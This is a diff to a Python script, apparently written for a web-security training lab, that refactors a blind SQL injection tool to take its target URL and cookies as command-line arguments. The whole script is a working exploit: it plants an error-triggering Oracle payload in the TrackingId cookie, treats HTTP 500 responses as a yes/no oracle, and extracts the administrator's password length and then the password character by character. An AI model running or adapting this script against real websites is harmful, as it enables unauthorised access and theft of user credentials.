@@ -1,15 +1,18 @@
+import argparse
 import requests
-
-LAB_URL = input("Lab URL: ").strip().rstrip("/") + "/"
-SESSION = input("Session cookie value: ").strip()
-TRACKING = input("TrackingId cookie value: ").strip()
 
 CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz"
 USERNAME = "administrator"
 
+LAB_URL = ""
+SESSION = ""
+TRACKING = ""
+
 
 def oracle(condition: str) -> bool:
-    payload = f"'||(SELECT CASE WHEN {condition} THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
+    payload = (
+        f"'||(SELECT CASE WHEN {condition} THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
+    )
     cookies = {"TrackingId": TRACKING + payload, "session": SESSION}
     try:
         return requests.get(LAB_URL, cookies=cookies).status_code == 500
@@ -19,7 +22,9 @@ def oracle(condition: str) -> bool:
 
 def find_length() -> int | None:
     for i in range(1, 100):
-        condition = f"(SELECT LENGTH(password) FROM users WHERE username='{USERNAME}') > {i}"
+        condition = (
+            f"(SELECT LENGTH(password) FROM users WHERE username='{USERNAME}') > {i}"
+        )
         if not oracle(condition):
             return i
     return None
@@ -38,9 +43,26 @@ def extract_password(length: int) -> str:
     return password
 
 
-length = find_length()
-print(f"[*] password length: {length}")
+def main():
+    global LAB_URL, SESSION, TRACKING
 
-if length:
-    password = extract_password(length)
-    print(f"[+] password: {password}")
+    parser = argparse.ArgumentParser(description="Blind SQLi password extractor")
+    parser.add_argument("lab_url", help="lab base URL")
+    parser.add_argument("session", help="session cookie value")
+    parser.add_argument("tracking", help="TrackingId cookie value")
+    args = parser.parse_args()
+
+    LAB_URL = args.lab_url.strip().rstrip("/") + "/"
+    SESSION = args.session.strip()
+    TRACKING = args.tracking.strip()
+
+    length = find_length()
+    print(f"[*] password length: {length}")
+
+    if length:
+        password = extract_password(length)
+        print(f"[+] password: {password}")
+
+
+if __name__ == "__main__":
+    main()
